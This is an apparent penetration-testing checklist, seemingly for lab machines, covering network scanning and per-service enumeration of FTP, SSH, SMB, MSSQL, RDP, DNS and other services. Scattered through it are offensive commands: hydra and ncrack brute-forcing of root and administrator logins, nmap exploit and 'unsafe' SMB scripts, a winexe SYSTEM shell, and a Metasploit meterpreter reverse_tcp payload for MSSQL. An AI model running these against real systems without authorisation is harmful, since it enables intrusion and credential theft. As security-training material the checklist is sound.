# Reconnaissance Enumeration Methodology🛠
## Pre engagement
- [ ] Log all commands of the current session
> script engagement_x.log
> ...
> exit # when the session has finished
- [ ] Set the target IP to the $IP  variable
> export $IP=x.x.x.x

## General methodology
- [ ] add host to your /etc/hosts if you already know its name or if you found it
- [ ] For every open port TCP/UDP
	- [ ] Find service and version
	- [ ] Find known service bugs
	- [ ] Find configuration issues
	- [ ] Run nmap port scan / banner grabbing
- [ ] Google-Fu
	- [ ] Every error message
	- [ ] Every URL path
	- [ ] Every paramenter to find versions/apps/bugs
- [ ] searchsploit every serivce
- [ ] Google
	- [ ] Every version exploit db
	- [ ] Every version vulnerability
- [ ] If app has auth
	- [ ] User enumeration
	- [ ] Password bruteforce
	- [ ] Default credentials (Google them)
- [ ] revert the machine
- [ ] Defcon 5 try:
> nmap --script exploit -Pn $IP
## Grab the damn banner!
- [ ] nc -v $IP \<PORT\>
- [ ] telnet $IP \<PORT\>
## Network & Port scanning
If you don't know the alive hosts,  you can scan the full subnet to find them, so you can do a deeper scan on them later.
### Go big
- [ ] List scan with nmap
> nmap -sL -oN nmap/listScan 10.x.x.x.x
- [ ] Ping scan (run it with privileges)
> nmap -sn -oN nmap/pingScan 10.x.x.x.x
- [ ] Look for hosts's info (name, logged-in user, MAC) with NetBIOS queries
	> nbtscan -r 10.x.x.x.x
- [ ] Use ARP to do hosts discovery
> netdiscover -r 10.x.x.x/24
- [ ] smbtree
### Go small (Individual host scanning)
- [ ] Run a simple TCP port scan to uncover open ports
> nmap -p- -T4 -oA nmap/ezTCPScan $IP
- [ ] Run a simple UDP port scan to uncover open ports
> nmap -sU -n -p- -T4 -oA nmap/ezUDPScan $IP
- [ ] If lazy do an Aggressive scan on open ports (A = O+sC+sV)
> nmap -A -T4 -px,y,z -v -oA nmap/aggressiveScan $IP
- [ ] Do a version detection on TCP ports
> nmap -sV --reason -O -p- $IP
- [x] Do a version detection on UDP ports
> nmap -sU -sV -n $IP
- [ ] Vulnerable to heartbleed?
> nmap --script ssl-heartbleed $IP
- [ ] Version/OS detection using other DNS servers
> nmap -v --dns-server \<DNS\> -sV --reason -O --open -Pn $IP
- [ ] Try identify unknown services
> amap -d $IP \<PORT\>
- [ ] Full vulnerability scanning with [vulnscan.nse]
> nmap -sS -sV --script=/path/to/your/vulnscan.nse -oN nmap/vulnScan $IP
## Service enumeration
### FTP (TCP 21) | TFTP (UDP 21)
- [ ]  [Banner grabbing](Box%20template/recon_enum_methodology%F0%9F%9B%A0.md#grab-the-damn-banner)
- [ ] Connect and check for anonymous access
- [x] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	- [ ] Check with nmap
	> nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -Pn -oN nmap/ftpVuln -p 21 $IP
- [ ] Default credentials check
> hydra -s \<PORT\> -C usr/share/wordlists/ftp-default-userpass.txt -u -f $IP ft  
### SSH (TCP 22)
- [ ]  [Banner grabbing](Box%20template/recon_enum_methodology%F0%9F%9B%A0.md#grab-the-damn-banner)
- [ ] User enumeration
	> msf > use auxiliary/scanner/ssh/ssh_enumusers

	> python /usr/share/exploitdb/platforms/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $IP
- [ ] Bruteforce root
> hydra -v -V -l root -P password-file.txt ssh://$IP
- [ ] Bruteforce list of user
> hydra -v -V -L userlist.txt -P password-file.txt ssh://$IP
- [ ] Use requested Key Exchange List
> ssh user@$IP -oKexAlgorithms={kex\_list}
- [ ] Use requested cipher
> ssh user@$IP -c {cipher}
- [ ] Use requested MAC
> ssh user@$IP -m {MAC}
### SMTP (TCP 25)
- [ ] Enumeration with nmap
>  nmap –script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay -Pn -oN nmap/smtpEnum -p 25,465,587 $IP
- [ ] nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	- [ ] Check with nmap
	> nmap –script smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -Pn -p 25,465,587 -oN nmap/smtpVuln $IP
- [ ] nc -nvv $IP
- [ ] manual testing with **telnet** and VRFY / EXPN
### Finger (TCP 79)
- [ ] Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum]
> finger-user-enum.pl -U users.txt -t $IP
### Web App (TCP 80/443)
#### Phase Alpha - enumeration
- [ ] Investigate SSL/TLS cert details for further information
- [ ] Investigate **robots.txt**
- [ ] Investigate **crossdomain.xml**
- [ ] Investigate **clientaccesspolicy.xml**
- [ ] Identify all parameters. Document which parameters are used for **GET** and **POST**
- [ ] View source code
- [ ] Nikto
- [ ] Directory Traversal Fuzzer
	- [ ] Gobuster (**Doesn't work recursively!!!**)
		- [ ] File and directory fuzzing
		- [ ] Vhost bruteforcing
		- [ ] use -x to look for specific extensions (.txt, .php, .bak, .cfg, .json, .md, .git)
		- [ ] nothing? Ensure that you scan the correct protocol (HTTP/HTTPS) and directory
		- [ ] gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 50 -e -u $IP
		- [ ] gobuster -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,403,500' -e -t 50 -u $IP/cgi-bin
		- [ ] Re-run for each directory found
	- [ ] wfuzz
	- [ ] dotdotpwn
- [ ] WhatWeb & weppalyzer to map the whole infrastructure:
	- [ ] Middleware
	- [ ] Programming languages
	- [ ] Backends
	- [ ] Services
	- [ ] Plugins
	- [ ] Which CMS is running?
		- [ ] wpscan
		- [ ] joomscan
		- [ ] drupwn
		- [ ] use nmap to enumerates installed Drupal themes/modules
		> nmap -p 80 --script http-drupal-enum <\TARGET\>
- [ ] WebDAV:
	- [ ] davtest
	- [ ] cadevar
	- [ ] Use nmap to detect WebDAV installations & listings:
	> nmap --script http-webdav-scan -p80,8080 $IP
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
- [ ] Check comments in source of all pages
> nmap -p80 --script http-comments-displayer -oN nmap/commentHTTP $IP
- [ ] RTFM! Read the manual for the application you are testing
	- [ ] Does it have a dev mode?
	- [ ] DEBUG=TRUE flag to see more?
	- [ ] Other interesting stuff?
- [ ] Look for where you can put data
	- [ ] API
	- [ ] Paywall or sign up
	- [ ] Unauthenticated
- [ ] Logical reasoning
	- [ ] Look at the application from a bad guy perspective, what does it do? what is the most valuable part? Some applications will value things more than others, for example a premium website might be more concerned about users being able to bypass the pay wall than they are of say cross-site scripting
	- [ ] Look at the application logic too, how is business conducted?
#### Phase Bravo - go deeper
- [ ] Follow webapp testing methodology [[webapp_testing_methodology🌐]]
- [ ] LFI / RFI test
- [ ] cgi-bin found? try shellshock [https://www.exploit-db.com/exploits/34900]
- [ ] Check every input field for SQLi
	- [ ] Cheatsheet 1 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]
	- [ ] Cheatsheet 2 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]
	- [ ] Cheatsheet 3 [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/  
]
- [ ] Check for code injection: [Owasp code injection]

### DNS (UDP/TCP 53)
- [ ] Find domain names for host
> whois $IP
- [ ] Find IP and authoritative servers
> nslookup domain.com
- [ ] Resolve DNS
> host website.com
> nslookup website.com
- [ ] Find name servers
> host -t ns domain.com
- [ ] Find mail servers
> host -t mx domain.com
- [ ] Is DNS zone transfer possible?
> nmap --script dns-zone-transfer -p 53 domain.com
- [ ] Request zone transfer
	> host -l domain.name dns.server 
	
	> dig axfr @dns-server domain.name

	> dnsrecon -d domain.com -t axfr
- [ ] dnsrecon -d $IP -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	
###  POP (TCP 110)
- [ ] Is username enumeration possible?
- [ ] Nmap enumeration (Default scripts runned with -sC flag):
	> nmap --script pop3-capabilities -Pn -oN nmap/popCapabilities -p 110,995 $IP

	> nmap --script pop3-ntlm-info -Pn -oN nmap/popInfo -p 110,995 $IP
- [ ] telnet $IP 110
	- USER user@IP
	- PASS admin
	- LIST - once logged in list messages
	- RETR \<MSG NUMBER\> - retrieve message
	- QUIT
- [ ] Bruteforce with nmap
> nmap -n -v -script pop3-brute -p 110 $IP 
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*

### RPCBind (TCP/UDP 111)
- [ ] rpcinfo -p $IP
### RPC (TCP 135)
- [ ] rpcinfo -p $IP
- [ ] 
### SMB (TCP 139/445)
- [ ] Enumeration
	> nmblookup -A $IP

	>  enum4linux -a $IP
	
	>  nmap --script=smb-enum* --script-args=unsafe=1 -T5 $IP
	
	> nmap -script smb-enum-shares.nse –script-args=unsafe=1 -p445 $IP

	> nmap -script smb-enum-users.nse –script-args=unsafe=1 -p445 $IP

	> nmap -script smb-protocols $IP
- [ ] nbtscan
- [ ] enum4linux
- [ ] Manual browsing (Prefer it whenever possible):
> smbclient -L INSERTIPADDRESS
> smbclient //INSERTIPADDRESS/tmp
> smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
> smbclient //INSERTIPADDRESS/ipc$ -U john
> smbclient //INSERTIPADDRESS/admin$ -U john
> winexe -U username //INSERTIPADDRESS "cmd.exe" --system
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	- [ ] Check with nmap
	> nmap -n -v --script="smb-vuln*" -oN nmap/smbAllVulns  -p 139,445 $IP
	> nmap -n -v -script smb-os-discovery.nse –script-args=unsafe=1 -oN nmap/smbOS -p 445 $IP
	> nmap -n -v script smb-check-vulns –script-args=unsafe=1 -oN nmap/smbCehckVulns -p445 $IP
### SNMP (UDP 161)
- [ ] Enumeration
	> for community in public private manager; do snmpwalk -c $community -v1 $IP; done

	> snmpwalk -c public -v1 $IP
	
	> snmpenum -t $IP
	
	> snmpcheck -t $IP -c public
	
	> nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
- [ ] Bruteforce community names
> onesixtyone -c names -i hosts # fast
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*

### MSSQL (TCP 1433)
- [ ] Enumerate MSSQL Servers
	> msf > use auxiliary/scanner/mssql/mssql_ping

	> nmap -sU --script=ms-sql-info $IP
- [ ] Password bruteforcing
	> hydra -l \<USERNAME\> -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt $IP -s \<PORT\> -t 5 mssql

	> hydra -s \<PORT\> -C ./wordlists/mssql-default-userpass.txt -u -f $IP mssql

	> medusa -h $IP -M mssql -u sa -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e ns -F -t 5

	> msf > use auxiliary/scanner/mssql/mssql_login
- [ ] Gain shell using gathered credentials
> msf > use exploit/windows/mssql/mssql_payload
> msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
- [ ] Log in to a MSSQL Server
> sqsh -S $IP -U sa -P password -D db_name
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	- [ ] Check with nmap
	> nmap -vv -sV -Pn -p \<PORT\> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa $IP
### Oracle (TCP 1521)
-  [ ] Default credentials
> hydra -s \[PORT\] -C ./wordlists/oracle-default-userpass.txt -u -f $IP
- [ ] tnscmd10g version -h $IP
- [ ] tnscmd10g status -h $IP
- [ ] **oracle-version** \- MSF module which scans Oracle DB to find the version
> msfcli auxiliary/scanner/oracle/tnslsnr\_version rhosts=$IP E
- [ ] **oracle-sid** \- MSF module to enumerate the Oracle DB SID
> msfcli auxiliary/scanner/oracle/sid\_enum rhosts=$IP E
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
### MySQL (TCP 3306)
- [ ] Default credentials?
> hydra -s \<PORT\> -C usr/share/wordlists/mysql-default-userpass.txt -u -f $IP mysql
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	- [ ] Check with nmap
	> nmap -sV -Pn -vv --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 $IP

### RDP (TCP/UDP 3389)
- [ ] Use rpd-sec-check to enumerate security settings:
> perl ./scripts/rdp-sec-check.pl $IP:\<PORT\>
- [ ] Use ncrack to brute force RDP:
> ncrack -vv --user administrator -P /user/share/wordlists/rockyou.txt rdp://<\TARGET\>
- [ ] Use hydra to bruteforce RDP:
> hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
- [ ] Check for BlueKeep
- [ ] Check login with default guest account and blank password
- [ ] Check with gathered users:passwds

### VNC (TCP 5900)
- [ ] Enum with nmap
> nmap -sV -Pn -vv --script\=vnc-info,vnc-title -oN nmap/vncEnum -p 5900 $ip
- [ ] Check for easy VNC passwords
- [ ] Bruteforce:
> hydra -s 5900 -P /usr/share/seclists/Passwords/darkweb2017-top10.txt vnc://$IP
- [ ] Any known vulnerability?
	- [ ] Check https://www.exploit-db.com/
	- [ ] Check https://www.cvedetails.com/
	- [ ] Check https://nvd.nist.gov/
	- [ ] Check on google
	> site:github.com *Service version.release*
	- [ ] Check with nmap
	> nmap -sV -Pn -vv --script realvnc-auth-bypass -oN nmap/vncAuthBypass -p 5900 $IP

### LDAP (TCP/UDP 389) | LDAPS (TCP/UDP 636)
- [ ]  LDAPSearch can be utilized to locate and retrieve directory entries
	> ldapsearch -h $IP -p \<PORT\> -x -s base

### Kerberos (88/464)
- [ ] Passive network sniffing
> kerbcrack
- [ ] User enumeration
> nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=research $IP
- [ ] Test MS14-068

### Image File Investigation
- [ ] Always use wget for downloading files to keep original timestamps and file information
- [ ] Use binwalk and strings to check image files for hidden content
- [ ] steghide

### NFS Share
- [ ] Show NFS shares
> showmount -e $IP \<PORT\>


### Linux/Windows
- [ ] smbclient -L //$IP
- [ ] rpcinfo
- [ ] enum4linux


### Packet inspection
- [ ] Wireshark
- [ ] tcpdump tcp port \<PORT\> -w output.pcap -i \<INTERFACE\>


### Anything else
- [ ] nmap scripts (locate *nse* | grep servicename)
- [ ] hydra
- [ ]  MSF auxiliary modules
- [ ]  Download the software and investigate it locally
- [ ]  Try enumeration scripts for specific services



[vulnscan.nse]: https://github.com/scipag/vulscan
[http://pentestmonkey.net/tools/user-enumeration/finger-user-enum]: http://pentestmonkey.net/tools/user-enumeration/finger-user-enum
[https://www.exploit-db.com/exploits/34900]: https://www.exploit-db.com/exploits/34900
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
[https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/  
]: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
[Owasp code injection]: https://owasp.org/www-community/attacks/Code_Injection
